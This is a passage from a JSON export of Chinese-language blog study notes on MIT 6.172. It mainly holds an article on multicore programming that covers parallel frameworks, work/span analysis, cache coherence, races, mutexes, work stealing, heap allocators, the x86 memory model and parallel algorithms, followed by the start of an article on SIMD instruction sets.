可以模拟缓存情况（在一定程度上）。但模拟器一般速度比较慢。\n","summary":"文章介绍了性能测量的注意事项，包括关闭后台进程、避免中断、绑定CPU核心等，以及外部和内部测量方法如time命令、rdtsc、clock_gettime，推荐使用clock_gettime确保时间单调递增，还提及采样、PMU计数和模拟器工具。","key":["mit6.172","软件性能工程","优化","测量"],"tags":[],"path":["cs","软件性能工程","软件性能工程-性能测量.md"],"background":"https://api.file.caiwen.work/picture/2025/09/23/20250923172148034.png","recommend":false,"status":"published"},{"type":"Article","title":"软件性能工程-多核编程","id":"mit6172-4","createTime":"2025-09-17T02:59:00.000Z","updateTime":"2025-10-07T06:45:11.098Z","content":"\r\n## 1. 并行方案\r\n\r\n### 1.1 Pthread\r\n\r\n具体参考 CSAPP 的笔记：https://www.caiwen.work/post/csapp-9\r\n\r\n创建的线程将由操作系统内核进行调度。使用线程的好处就是可以灵活地进行控制，缺点就是创建线程的开销太大（可以使用线程池解决，即提前创建好若干线程放到线程池中等待使用。我们不断地去复用线程池中的线程，避免了来回创建又销毁的开销），而且需要人为控制，容易出问题。\r\n\r\n### 1.2 Threading Building Blocks\r\n\r\n这是由 Intel 主导的一个多任务并行的库。\r\n\r\n我个人感觉这个有点像 Rust 的 Tokio。大概思想可以理解为就是他内部有个线程池（线程池中线程的个数一般和 CPU 核心数量差不多，即一个核心上跑一个线程）。\r\n\r\n我们把需要并行的任务当作一个“轻量级的协程”。TBB 将在运行时决定把一个任务放到哪个 CPU 的核上去运行。和单纯的线程相比，创建任务的开销很小，并且任务之间上下文的切换的开销也比较小。同时，TBB 使用了 work stealing 的任务调度算法，使得其可以充分利用 CPU 各个核。\r\n\r\n大概的语法如下：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/17/68ca51c1b2d8c.png)\r\n\r\n值得一提的是，`set_ref_count` 设置当前任务数量，应设置为要 spawn 出去的子任务数量再加上 1（即自己本身）。然后后面的 `spawn_and_wait_for_all` 就是根据前面设置的 `set_ref_count` 来判断是不是已经 wait 掉所有任务了。\r\n\r\n### 1.3 OpenMP\r\n\r\nOpenMP 相当于是一个语法层面的扩展，目前很多编译器已经支持。在编译时添加 `-fopenmp` 即可启用对 OpenMP 的语法解析，并且编译器会链接 OpenMP 的库。\r\n\r\n感觉 OpenMP 和 TBB 一样，就是把线程进行了封装，在运行时进行调度。\r\n\r\n不过 OpenMP 的一个优点时，适合快速将已有的代码变成并行的，更简洁一点。\r\n\r\n![](http://pic.caiwen.work/i/2025/09/17/68ca546e34b63.png)\r\n\r\n## 2. 并行度\r\n\r\n我们可以根据程序的过程得到一个 DAG：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/17/68ca5740c2f60.png)\r\n\r\n其中一个点连出去多个点，意味着这些点都可以并行地计算。上图标号为 4 的框中，紫色的点连出去另一个紫色的点，表示 spawn 出去一个任务，连出去绿色的点表示 spawn 完任务之后自己继续执行的代码。最后经过 `cilk_sync` 同步之后会来到蓝色的那个点。\r\n\r\nDAG 上的每一个点都被称为一个 strand，表示不存在 spawn、sync、call、return 这些的指令序列。同时，入度为 0 的点称为 initial strand，出度为 0 的点称为 final strand。同时各个边也根据行为有不同的名称：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/17/68ca591832d2a.png)\r\n\r\n我们再看一个 DAG：\r\n\r\n![](http://pic.caiwen.work/i/2025/09/17/68ca59ed0a271.png)\r\n\r\n假定 DAG 上每个点都耗时一个单位时间。\r\n\r\n定义 **work** 表示总工作量，记为 $T_1$，为所有点的数量。也可以理解为是只使用单核计算的耗时。在这个 DAG 中 $T_1=18$。\r\n\r\n定义 **span** 表示 DAG 上的最长点数路径的长度，记为 $T_{\\infin}$。也可以理解为假如我们有无穷多个 CPU 核心进行计算的耗时。我们也称 span 为 **critical-path length** 或是 **computational depth**。在这个 DAG 中 $T_{\\infin}=9$。\r\n\r\n令 $P$ 表示 CPU 核心数量，$T_P$ 表示利用 P 个 CPU 核心并行计算所耗费时间，我们有：\r\n\r\n**Work Law**：$T_P\\ge \\frac{T_1}{P}$。可以认为，我们把全部的 work 都分到所有的核上，这样最少也是 $\\frac{T_1}{P}$ 的时间。而考虑到分配的开销，以及可能调度并没有使所有核都一直处于工作状态，所以时间会有所增加。\r\n\r\n**Span Law**：$T_P \\ge T_{\\infin}$。\r\n\r\n定义 **speed up** 为 $\\frac{T_1}{T_P}$。\r\n\r\n- 如果 $\\frac{T_1}{T_P} < P$，我们就得到了一个 **sublinear speedup**。\r\n- 如果 $\\frac{T_1}{T_P} = P$，我们就得到了一个 **linear speedup**。\r\n- 如果 $\\frac{T_1}{T_P} > P$，我们就得到了一个 **superlinear speedup**。在我们目前的简单模型中是不会出现的，因为这和 Work Law 是矛盾的。但是实际情况中会出现，这是因为，我们目前隐含的前提是，并行运行和串行运行时，一个任务的耗时是不变的。而实际上可能会出现这样一种情况，比如我们要处理一个很大的数据，直接串行的话可能会使得缓存命中率不高。而如果把数据切分成小块，在不同的 CPU 核心上并行运行时，可能处理的数据大小恰好能放入缓存中，使得缓存命中率增高，因此耗时变短。\r\n\r\n定义 **parallelism** 为我们能获得的最大的 speedup，也称为并行度。根据 Span Law，parallelism 就等于 $\\frac{T_1}{T_{\\infin}}$。\r\n\r\n## 3. 并行问题\r\n\r\n### 3.1 缓存一致性\r\n\r\nCPU 中每个核有自己的 L1 和 L2 缓存，然后又有共享的 L3 缓存。这样一来，就可能出现缓存一致性的问题，比如一个核将某个地址的数据缓存到自己的 L2 缓存中，另一个核又把这个地址的数据修改了，而前者的 L2 缓存此时并没有更新，这就出现了不一致的问题。\r\n\r\n为了使得多核之间的缓存保持一致，我们有 MSI 协议，每个缓存行都有如下的三种状态：\r\n\r\n- M：当前缓存行中的缓存块被修改了。MSI 协议要求此时不存在其他的核，使得该缓存行处于 M 或是 S 状态。\r\n- S：其他的核中可能也存在这个缓存行，这个缓存行是被共享的。\r\n- I：当前缓存行是无效的。\r\n\r\n那么每当一个核要对数据进行修改时，除了修改自己核的缓存中的数据之外，还把当前缓存行状态置为 M，并将其他核中的该缓存行（如果有）状态置为 I。\r\n\r\n缓存一致性又带来了新的缓存不命中情形：Sharing miss，而 Sharing miss 又可以分为如下两种：\r\n\r\n* True-sharing miss：一个核修改了某个内存之后，把其他核在该内存处的缓存全部失效。此时其他核再访问此处内存就会产生缓存不命中，就是 true-sharing miss。\r\n* False-sharing miss：有可能一个核修改的内存位置和另一个核后续访问的内存位置不同，但是两个位置是一个 cache line。这就使得前者修改后，后者的缓存也失效了。\r\n\r\n### 3.2 Race\r\n\r\n**determinacy race**：假设有两个并行的程序都在访问同一个内存位置，并且至少有一个程序进行了写操作。\r\n\r\n**data race**：假设有两个并行的程序都_无锁地_访问同一个内存位置，并且至少有一个程序进行了写操作。\r\n\r\n有时候没有 data race 但会有 determinacy race，如：\r\n\r\n![image-20251002220807526](https://api.file.caiwen.work/picture/2025/10/02/image-20251002220807526.png)\r\n\r\n**benign race**：看似没什么影响的 race，如：\r\n\r\n```cpp\r\nstruct {\r\n    char a;\r\n    char b;\r\n} x;\r\n```\r\n\r\n如果一个线程修改 `x.a`，一个线程修改 `x.b`，这看似是没什么影响的。但是在一些架构或是编译优化行为上，可能会出现将这个结构体看成是 16 位的整体进行更新。这就导致看似只是修改了 `x.a` ，但其实又修改了 `x.b`。不过这在 Intel 的 X86 架构上应该是不会出现这种问题的。但是需要注意一点，我们在之前优化技巧中提到了位域语法，使用这个的话就需要注意 Race 的问题了。\r\n\r\n#### 3.2.1 Mutex\r\n\r\nmutex 有如下属性：\r\n\r\n* **yielding/spinning**\r\n  * yielding：在等待锁的时候会主动向操作系统交出当前进程的控制权\r\n  * spinning：在等待锁的时候会死循环，直到把当前时间片消耗完\r\n* **reentrant/nonreentrant**\r\n  * reentrant：一个 reentrant mutex 可以做到让一个已经获得到当前锁的线程再次尝试获取当前锁\r\n  * nonreentrant：一个 nonreentrant mutex 会使得已经获得到当前锁的线程再次尝试获取当前锁时会出现死锁\r\n* **fair/unfair**\r\n  * fair：一个 fair mutex 会使得等待锁实现最长的线程拿到锁\r\n  * unfair：unfair mutex 则不保证这一点\r\n\r\n一个 mutex 的实现：\r\n\r\n![image-20251002222023887](https://api.file.caiwen.work/picture/2025/10/02/image-20251002222023887.png)\r\n\r\n其中 `xchg mutex, %eax` 是关键。`xchg` 是一个原子指令，不会被打断，其作用是将 `mutex` 和 `%eax` 进行交换。\r\n\r\n其实整个 mutex 的关键在 `Get_Mutex` 中，理论上讲我们并不需要 `Spin_Mutex` 也能够实现，但是这么做的话我们会不断地执行 `xchg` 指令修改 `mutex`，而 `mutex` 是一个多线程共享的变量，根据 MSI 协议，这会使得其他核上的存有 `mutex` 的 cache line 被反复失效，引发效率问题。\r\n\r\n**锁竞争**\r\n\r\n拿锁时我们希望做到如下的两点：\r\n\r\n* 当锁被释放时尽可能拿到锁\r\n* 当锁没被释放时尽可能让浪费的时间少\r\n\r\n如果是 spining mutex，会使得锁被释放后立刻拿到锁，但是会使得非常多的时间浪费在拿锁上。如果是 yielding mutex，那么会使得浪费的时间很少，但是当前线程被系统调度出去之后，可能要等很久之后才会再次被调度，锁被释放后不能立即拿到锁。\r\n\r\n为了平衡这两点，我们可以有这样一个解决方案：先 spin 一段时间，然后再 yield。spin 的时间与线程被操作系统调度出去再调度回来的时间一致。（lecture 上说是比较优的，我个人感觉和 yielding 差不多）\r\n\r\n#### 3.2.2 Reducer\r\n\r\n锁太昂贵。在一些情况下我们可以不用加锁，改用一个叫做 Reducer 的东西。\r\n\r\nReducer 的大概思想就是，如果多个线程需要操作同一个全局变量，那么我们把这个全局变量”局部化“，让线程的操作仅自己可见。然后再最后同步的时候再把各个线程对这个全局变量的操作进行合并。但是 Reducer 有两点局限性：首先它要求操作必须有结合律，其次要求线程不需要获取全局变量当前的值。\r\n\r\n### 3.3 Scheduling\r\n\r\n现在比较好的一个任务调度策略是 Work Stealing。大概的思想是，每个核心都维护一个 deque，表示当前的任务队列。如果当前任务产生了新的任务，那么就把新任务放入队列的头部，执行这个新任务。如果当前队列的任务都执行完了，那么就去考虑从其他队列的尾部 steal 一些任务过来，使得自己永远保持忙碌。\r\n\r\n这个策略的耗时大概是 $T_P \\approx \\frac{T_1}{P} + O(T_{\\infin})$。简单的证明就是，所有核的耗时加起来一定是 $T_1$ 再加上 steal 产生的开销。每次 steal 都有 $\\frac{1}{P}$ 的概率 steal 到 critical path 上的任务，使得 span 减一。那么全部的 steal 开销期望就是 $O(PT_{\\infin})$。这些时间能分摊到 $P$ 个核心上，所以耗时就是：\r\n\r\n$$\r\n\\frac{T_1+O(PT_{\\infin})}{P} = \\frac{T_1}{P} + O(T_{\\infin})\r\n$$\r\n\r\n我们也能感性地去考虑为什么这个策略很优。首先，一个基本的思想是，你让所有的核心都在不停地执行任务，这样利用率肯定好。沿着这个思路，大概有两种实现，一种是这里的 work stealing，另一种是，如果有新任务产生了，那么我们考虑把这个新任务分给当前压力最小的队列中去。但后者这么做的话，每次产生一个任务都需要一个分配任务的开销，但 work stealing 的策略只会在出现无事可做之后才会去产生分配的开销。而且后者把任务放到其他队列的时候需要加锁，但 work stealing 可以把锁的开销尽可能减小甚至无锁。（参考论文 _The Implementation of the Cilk-5 Multithreaded Language_ ，链接 https://pages.cs.wisc.edu/~swilson/cilk.pdf 第 7 页。不过论文中似乎只讨论了 Thief 和 Worker 的竞争而没说多个 Thief 抢一个 Worker 该怎么搞）\r\n\r\n### 3.4 堆分配\r\n\r\n**blowup**：在并行时所消耗的堆空间与串行时所消耗堆空间的比值。\r\n\r\n**user footprint**：程序所分配出去的最大空间。\r\n\r\n**allocator footprint**：程序申请到的最大空间。\r\n\r\n#### 3.4.1 策略一：Global Heap\r\n\r\n直接给 global heap 设置一个锁，当一个线程想要申请/释放内存的时候需要加锁。\r\n\r\n这样的 blowup 为 1，但是锁的开销很大。\r\n\r\n#### 3.4.2 策略二：Local Heaps\r\n\r\n每个线程都有自己的堆。\r\n\r\n这样的好处是不需要加锁，没有同步的开销。\r\n\r\n坏处是可能发生 memory drift，即在 A 线程申请的内存被 B 线程释放时（比如生产-消费的模式），释放的内存会放入 B 线程中。然后设想一个情况，A 线程一直在申请内存，B 线程一直在释放内存，如果是串行情况的话不会有问题，但并行时发生 memory drift 的话会使得线程 A 的栈空间一直不够用，之前申请的空间全部跑到线程 B 了，从而导致 blowup 没有限制。\r\n\r\n#### 3.4.3 策略三：Local Ownership\r\n\r\n在策略二的基础上，我们对每个对象记录一下他是从哪个线程申请过来的。释放对象之后把内存放入其所属线程的堆中。\r\n\r\n好处是这样 blowup 得到了限制，并且还减少了 false sharing，因为对象都会交给其所属线程进行处理。如果交给不同的线程的话可能会 invalidate 掉整个 cache line。\r\n\r\n#### 3.4.4 The Hoard Allocator\r\n\r\n有一个 global heap 和 $P$ 个 local heaps。local heap 与 global heap 传递内存的时候以 $S$ 大小的 superblock 为单位。\r\n\r\n申请内存时：\r\n\r\n![image-20251002193431334](https://api.file.caiwen.work/picture/2025/10/02/image-20251002193431334.png)\r\n\r\n不同的是，释放内存的时候，释放掉的内存块会放入当前线程的堆中。当然这么做的话似乎又会出现与策略二一样的问题，因此我们还需要维护如下的式子：\r\n$$\r\nu_i \\ge min(a_i - 2S, \\frac{a_i}{2})\r\n$$\r\n其中 $a_i$ 为当前堆拥有的内存大小，$u_i$ 为当前堆实际分配出去的内存大小。\r\n\r\n![image-20251002193900285](https://api.file.caiwen.work/picture/2025/10/02/image-20251002193900285.png)\r\n\r\n这样做的目的在于，我们可以确保 blowup 为 $O(1+\\frac{SP}{U})$。\r\n\r\n证明：\r\n\r\n$u_i \\ge min(a_i - 2S, \\frac{a_i}{2})$ 中，$u_i\\ge a_i-2S$ 表明一个堆最多有 $2S$ 的空间是没有被分配的，那么 $P$ 个堆最多是 $2SP$ 的空间没有被分配，即 $O(SP)$。$u_i \\ge \\frac{a_i}{2}$ 表面一个堆最多只能有一般的空间没有被分配，$P$ 个堆最多就是 $O(U)$ 的空间没有被分配。于是有：\r\n$$\r\nA \\le O(U+SP) \\\\\r\n\\frac{A}{U} = O(1+\\frac{SP}{U})\r\n$$\r\n我们这个方案相比于方案三，不仅释放内存的时候锁的开销比较少，而且 blowup 还更低。\r\n\r\n### 3.5 内存模型\r\n\r\n#### 3.5.1 Relaxed Consistency\r\n\r\n![硬件层面的示意图](https://api.file.caiwen.work/picture/2025/10/03/image-20251003232616856.png)\r\n\r\n处理器发射 store 指令的速度快于 memory network 可以处理的速度。所以在处理器和 memory system 之间会有一个 store buffer。\r\n\r\nload 指令拿到数据后，随后的指令会依赖于这个数据，因此 load 指令可能会让处理器暂停，直到从内存中拿到数据。为了让 load 指令的延迟被 cover 掉，现代处理器可能会让 load 指令先于 store 指令执行（这就出现了乱序执行，也就是上图的 load bypass）。如果 load 要读的地址刚好是之前 store 写入的地址，但是 store 操作还位于 store buffer 中的话，load 指令可以直接从 store buffer 中拿到之前写的数据。\r\n\r\n我们考虑下面两个线程的代码：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003215633931.png)\r\n\r\n这两个代码可能会交叉执行，但是有一点似乎是应该保证的，那就是一定先执行指令 1 然后再执行指令 2，指令 3 和指令 4 同理。我们称这种保证是 **sequential consistency**。因此所有可能的情况如下：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003220009998.png)\r\n\r\n因此不可能出现最后 `%eax` 和 `%ebx` 都为 0 的情况。\r\n\r\n而上面我们讲处理器可能会让 load 先于 store 执行，这就不是 sequential consistency，而是 relaxed consistency。由此可能带来的结果：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003233542184.png)\r\n\r\nIntel X86-64 的内存模型有如下几个规则：（同时可以参考：[Manuals for Intel® 64 and IA-32 Architectures 中 Volume 3A 的 10.2 的 Memory Ordering](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)，[Intel SDM 之 Memory Ordering - 知乎](https://zhuanlan.zhihu.com/p/626802876)）\r\n\r\n* 同类型操作之间不会发生 reorder\r\n* store 不会被移到 load 的前面（这反而会拖慢处理器运行）\r\n* load 会移动到 store 前面，但前提是 load 和 store 的地址不一样（否则再 reorder 就不对了）\r\n* lock 操作（和锁有关的指令，比如一些原子操作指令）不会与 load 或是 store 进行 reorder\r\n\r\n上述规则是对于单个 processor 的。对于多个 processor 之间还有如下的规则：\r\n\r\n* 两个 processor 的 store 操作的先后顺序，在不同的 processor 中可能是不一样的，比如下图，在 processor 0 看来，`mov [_x], 1` 最先执行的，`mov [_y,1]` 是最后执行的，这导致 `r2=0`。而在 processor 1 看来，`mov [_y,1]` 是最先执行的，`mov [_x], 1` 最后执行的，这导致 `r4=0`。出现这种问题的原因在于这两个 processor 各自的 store 操作只是被放入了自己的 store buffer 中，还没有被应用到 memory system 中。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003235047961.png)\r\n\r\n* 操作的顺序遵循因果律，比如下图，假设有 `r1=1` 和 `r2=1` 成立，那么就说明 processor 0 的 `mov [_x], 1` 先于 processor 1 的 `mov r1, [_x]` 执行，然后我们知道 `mov r1, [_x]` 与 `mov [_y], 1` 是不能 reorder 的，所以 `mov [_y], 1` 在随后执行。由于 `r2=1`，那么同理，后面是执行 `mov r2, [_y]` 再执行 `mov r3, [_x]`。于是所有指令的执行先后顺序都被我们推理出来了，并且得知 `mov [_x], 1` 最先执行，`mov r3, [_x]` 最后执行，所以 `r3` 必然为 1.\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003235631147.png)\r\n\r\n* 除了执行 store 的处理器之外，所有处理器看到的两个 store 操作的顺序都是一致的。不会出现某些处理器先看到 store a 再 store b，另一些处理器先看到 store b 再看到 store a。如下图，如果假设 `r1=1` 且 `r2=0`，那么就说明对于 processor 2 而言，`mov [_x], 1` 先执行，`mov [_y], 1` 后执行。那么对于 processor 3 而言也应该是这个顺序，所以就不会出现 `r3=1` 且 `r4=0` 的情况。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003235748945.png)\r\n\r\n* lock 操作的顺序对于所有处理器来说都是一样的。有点类似于上面那个规则。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/04/image-20251004000036095.png)\r\n\r\n值得一提的是，reorder 不是必须的。如果把 load 提前的话，那么拿到的数据需要在寄存器中存放更久，占用寄存器更多。如果寄存器不够分配了，那么就不会产生 reorder。\r\n\r\n#### 3.5.2 Memory Fence\r\n\r\n这样的 relaxed consistency 的内存模型会给我们带来麻烦。比如我们实现 peterson 算法（仅用 load 和 store 操作实现锁，见 [2025春操作系统训练营游记（一二阶段） - Caiwen的博客](https://www.caiwen.work/post/2025-os-camp-2#hu-chi)）这个算法依赖于 sequential consistency。在 relaxed consistency 下会出现这样的情况：\r\n\r\n![C实现的peterson算法](https://api.file.caiwen.work/picture/2025/10/04/image-20251004000945481.png)\r\n\r\n读取 `B_wants` 的操作被处理器或是编译器提前到了写 `A_wants` 之前。对于右侧的代码也是同理。\r\n\r\n为了防止代码被 reorder，我们需要 memory fence。memory fence 下方的代码不会被 reorder 到上方。memory fence 的开销比较大，甚至比锁的开销还大（锁的内部应该是有用到 memory fence。而反而是锁的开销更小的原因可能是处理器的设计人员对锁进行了更多的优化）。X86 中有 `mfence` 指令。在 C 语言中可以使用来自 `stdatomic.h` 的 `atomic_thread_fence()` 来实现。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/04/image-20251004002829107.png)\r\n\r\n这还没完，不仅处理器会 reorder ，编译器也会，有可能编译器会把我们 critical section 中的操作给 reorder 到上方。我们可以使用 `asm volatile(\"\":::\"memory\")` 来实现只针对于编译器的 memory fence：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/04/image-20251004003022204.png)\r\n\r\n在 C11 标准中引入了 `atomic_store` 和 `atomic_load`。这两个东西保证了读写的原子性（在 32 位系统中对 64 位的读写可能是分两次的），并且确保不会被重排序（ 默认情况，可选内存模型）。被  `atomic_store` 和 `atomic_load` 操作的变量需要有 `_Atomic` 修饰。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/04/image-20251004003253165.png)\r\n\r\n## 4. 并行算法\r\n\r\n### 4.1 循环\r\n\r\n考虑如下代码：\r\n\r\n```cpp\r\nfor (int i = 0; i < n; i++) {\r\n    a[i] += b[i];\r\n}\r\n```\r\n\r\n如果我们考虑并行化的话，可以写成如下代码：\r\n\r\n![image-20250923090041690](https://api.file.caiwen.work/picture/2025/09/23/image-20250923090041690.png)\r\n\r\n其对应的 DAG 为：\r\n\r\n![image-20250923090114144](https://api.file.caiwen.work/picture/2025/09/23/image-20250923090114144.png)\r\n\r\n我们分析一下：\r\n\r\n* Work：总的运算量应该是 $O(n)$ 的\r\n* Span：Span 所在路径为从 Initial Strand 到最右边的灰点，为 $O(G+\\frac{n}{G})$\r\n\r\n如果我们不使用循环展开，那么 $G=1$，Span 就为 $O(n)$，并行度就是 $O(1)$ 的，约等于没有产生优化。所以如果循环中的 Work 比较小，我们不应该类似于上面这样单纯顺序地循环去 spawn。\r\n\r\n如果我们使用循环展开，显然取 $G=\\sqrt{n}$ 能够使得 Span 最小，最小值为 $O(\\sqrt{n})$，那么并行度为 $O(\\sqrt{n})$。\r\n\r\n对于循环，更好地做法应该是把循环转化成一种递归的形式：\r\n\r\n![image-20250923091512661](https://api.file.caiwen.work/picture/2025/09/23/image-20250923091512661.png)\r\n\r\n上面的 G 表示剩余的大小小于 G 就不再继续往下分了。\r\n\r\n其对应的 DAG 为：\r\n\r\n![image-20250923091555669](https://api.file.caiwen.work/picture/2025/09/23/image-20250923091555669.png)\r\n\r\n* Work：$n\\cdot I + (\\frac{n}{G}-1)\\cdot S$ （tips：完全二叉树内部节点数量）\r\n* Span：$G\\cdot I + \\log {\\frac{n}{G}}\\cdot S$\r\n\r\n粗略地分析，会发现并行度还是比较优的。\r\n\r\n### 4.2 矩阵转置\r\n\r\n一般我们是并行化外部循环的，如果只并行化内部循环，span 并不会降低太多。\r\n\r\n![image-20250923095338152](https://api.file.caiwen.work/picture/2025/09/23/image-20250923095338152.png)\r\n\r\n如果给内层循环也并行化的话，会进一步降低 span：\r\n\r\n![image-20250923095456527](https://api.file.caiwen.work/picture/2025/09/23/image-20250923095456527.png)\r\n\r\n我们获得的并行度就更大了。一般我们只需要让并行度是 CPU 核心数的 10 倍即可。过大的并行度我们其实并不能充分地利用。反而，由于我们 Spawn 了很多内部节点，所以 Work 有所增加，反而拖慢了我们的速度。\r\n\r\n### 4.3 归并排序\r\n\r\n传统归并排序会将当前序列平均分成两部分，分别进行排序，然后再合并。现在我们考虑将两个子部分分别排序的操作并行化。这样做的 Work 是 $O(n\\log n)$ 的，Span 为 $T_{\\infin}(n) = T_{\\infin}(\\frac{n}{2})+O(n)=O(n)$，于是并行度为 $O(\\log n)$ 的。\r\n\r\nSpan 的瓶颈在于将两个排好序的序列进行合并。我们考虑也将合并操作并行化：我们令 $A$ 序列为长度较大的那个序列，然后取 $A$ 序列中中间的那个元素，我们假设其为 $x$。那么 $A$ 序列就可以被平均分成大于 $x$ 和小于 $x$ 的两部分。同理 $B$ 序列也可以被**不**平均分成大于 $x$ 和小于 $x$ 的两部分。其中小于 $x$ 两部分之间的合并和大于 $x$ 两部分之间的合并是可以相互独立，并行执行的。\r\n\r\n![image-20250923153131380](https://api.file.caiwen.work/picture/2025/09/23/image-20250923153131380.png)\r\n\r\n于是合并操作的 Span 为 $T_{\\infin}\\le T_{\\infin}(\\frac{3n}{4})+O(\\log n) = O(\\log ^2 n)$，Work 为 $O(n)$ （至于怎么来的，我看 ppt 没看太懂...）。\r\n\r\n此时归并排序的 Work 不变（合并操作的 Work 都没变），Span 为 $T_{\\infin}(n) = T_{\\infin}(\\frac{n}{2})+O(\\log ^2 n) = O(\\log ^3 n)$。此时获得的并行度为 $O(\\frac{n}{\\log ^ 2 n})$。\r\n\r\n### 4.4 二维 DP\r\n\r\n假设我们有类似于下面的 DP 转移方程：\r\n$$\r\nA_{i,j} = f(A_{i,j-1}, A_{i-1,j}, A_{i-1,j-1})\r\n$$\r\n现在我们想将其并行化，可以考虑将整个的 $n\\times n$ 区域划分为如下四个部分：\r\n\r\n![image-20250923153914988](https://api.file.caiwen.work/picture/2025/09/23/image-20250923153914988.png)\r\n\r\n其中同种颜色就是可以并行的。\r\n\r\n* Work：$T_1(n)=4T_1{\\frac{n}{2}}+O(1)=O(n^2)$\r\n* Span：$T_{\\infin}(n)=3T_{\\infin}(\\frac{n}{2})+O(1)=O(n^{\\log 3})$\r\n* 并行度：$O(n^{0.41})$\r\n\r\n当然我们还可以做更细的划分：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/09/23/image-20250923154201004.png)\r\n\r\n可以得到 $O(n^{0.53})$ 的并行度。但是这种做法的缓存局部性要差一点，实际中未必比上面那种快。\r\n\r\n### 4.5 BFS\r\n\r\n我们把 BFS 的每一层都看作是一个 frontier，我们一个一个 frontier 地处理，同一个 frontier 的点并行处理：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/07/image-20251007131050487.png)\r\n\r\n![代码实现](https://api.file.caiwen.work/picture/2025/10/07/image-20251007131153147.png)\r\n\r\n直接并行的话可能会出现 data race，因为 frontier 中不同的点可能会指向同一个点，此时这个点的 `parent` 设为谁就会有问题。上面的 `compare-and-swap` 就相当于一个无锁的解决该 race 的方法。\r\n\r\n但是这也带来了一个 nondeterministic，对于同一个图进行 BFS，最后得到的 `parent` 数组都可能不一样。为了再去掉这个 nondeterministic，我们规定如果有多个点都指向同一个点，那么编号最小的点作为该点的 `parent`。\r\n\r\n![nondeterministic BFS](https://api.file.caiwen.work/picture/2025/10/07/image-20251007132244869.png)\r\n\r\nphase 1 中我们让最小的值才能写入 `parent`（注意这里不去判断 `ngh` 是否已经被遍历过）。phase 2 中再遍历一遍所有的边，如果当前点已经作为 `ngh` 的 `parent` 之后，我们就把 `ngh` 的 `parent` 取负，这样就使得 phase 1 是正确的。\r\n\r\n对于大多数图，frontier 的大小呈先增大后减小的趋势：\r\n\r\n![image-20251007132959650](https://api.file.caiwen.work/picture/2025/10/07/image-20251007132959650.png)\r\n\r\n在 BFS 的时候有两种方式，一种是从 frontier 的点出发，去给别的点尝试标 `parent`（就是上面的方法），我们称这种是 Top-down 的。另一种是遍历所有还没有设置 `parent` 的点，然后判断这些点是否有一条连向当前 frontier 的边，有的话就说明为这个点找到了他的 `parent`，设置并 break，我们称这种是 Bottom-up 的。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/07/image-20251007133534155.png)\r\n\r\n如果后者在进行 `for all neighbors ngh of v` 的时候是按点编号从小到大进行遍历的话，那么这种方式甚至不会产生 nondeterministic，也就不需要原子操作。在 BFS 的早期，遍历到的点还比较少时，使用 Top-down 是优的。随着 BFS 的进行 frontier 可能增大，剩余还没遍历到的点变少，Bottom-up 可能是更优的。所以我们可以结合两种方法，比如当 frontier 大小大于 $\\frac{n}{20}$ 的时候使用 Bottom-up，反之则使用 Top-down。\r\n\n","summary":"文章介绍了并行计算的方案（Pthread、TBB、OpenMP）、并行度概念、常见问题（缓存一致性、Race、调度、堆分配、内存模型）及并行算法（循环、矩阵转置、归并排序、二维DP、BFS），涵盖原理、优化和实现细节。","key":["mit6.172","软件性能工程","优化","并行","多核","线程","调度","work stealing","缓存一致","race","mutex","锁","reducer","堆","内存分配","内存模型"],"tags":[],"path":["cs","软件性能工程","软件性能工程-多核编程.md"],"background":"http://pic.caiwen.work/i/2025/09/21/68cf4c541ab39.png","recommend":false,"status":"published"},{"type":"Article","title":"软件性能工程-现代处理器架构","id":"mit6172-3","createTime":"2025-09-14T15:31:00.000Z","updateTime":"2025-09-14T16:38:02.470Z","content":"\r\n## 1. Vector Hardware\r\n\r\n### 1.1 SSE 指令集\r\n\r\nCPU 内有 `xmm` 寄存器，可以存储 128 位，表示一个向量。可以存储 4 个 32 位标量，又或者 2 个 64 位标量。SSE 指令可以做到一条指令就可以将向量中的每个元素都执行某个操作。元素可以是单精度、双精度和整数。SSE 指令集也可以只使用寄存器的低 32 或 64 位进行操作。一般 SSE 指令是普通指令加下面的后缀：\r\n\r\n| 汇编指令后缀 | 精度   | 标量/向量 |\r\n| ------------ | ------ | --------- |\r\n| `ss`         | 单精度 | 标量      |\r\n| `sd`         | 双精度 | 标量      |\r\n| `ps`         | 单精度 | 向量      |\r\n| `pd`         | 双精度 | 向量      |\r\n\r\n比如：`mulsd %xmm0, %xmm1`、`movsd (%rcx, %rsi, 8), %xmm1`\r\n\r\n如果想操作整数向量，那么需要加一个 `p` 前缀，然后后缀可选 `b`（8 位）、`w`（16 位）、`d`（32 位）、`q`（64 位），如：`paddq`。\r\n\r\n如果想操作整数标量的话，直接使用朴素的指令集即可。\r\n\r\n### 1.2 AVX 指令集\r\n\r\nAVX 指令集可以选择 `ymm` 寄存器，相当于是 `xmm` 寄存器的扩展，有 256 位，也就是比如 `%ymm0` 的低 128 位是 `%xmm0`。AVX 的指令只需要在 SSE 指令的基础上在最前面加一个 `v` 前缀，如：`vpaddq`。\r\n\r\n* AVX 指令集仅支持浮点数\r\n* AVX2 指令集支持了整数\r\n* AVX3（AVX-512）指令集又将寄存器扩展到 512 位（`zmm` 寄存器）。\r\n\r\n## 2. Out-of-order Execution\r\n\r\n现代 CPU 不一定按照指令原来的顺序执行指令，因为我们考虑如果两个指令之间没什么数据关系的话，先执行谁都是无所谓的。不过我们会存在如下的数据冒险情况：\r\n\r\n* RAW：前一条指令写了一个寄存器，后一条指令读这个寄存器\r\n* WAR：前一条指令读了一个寄存器，后一条指令写这个寄存器\r\n* 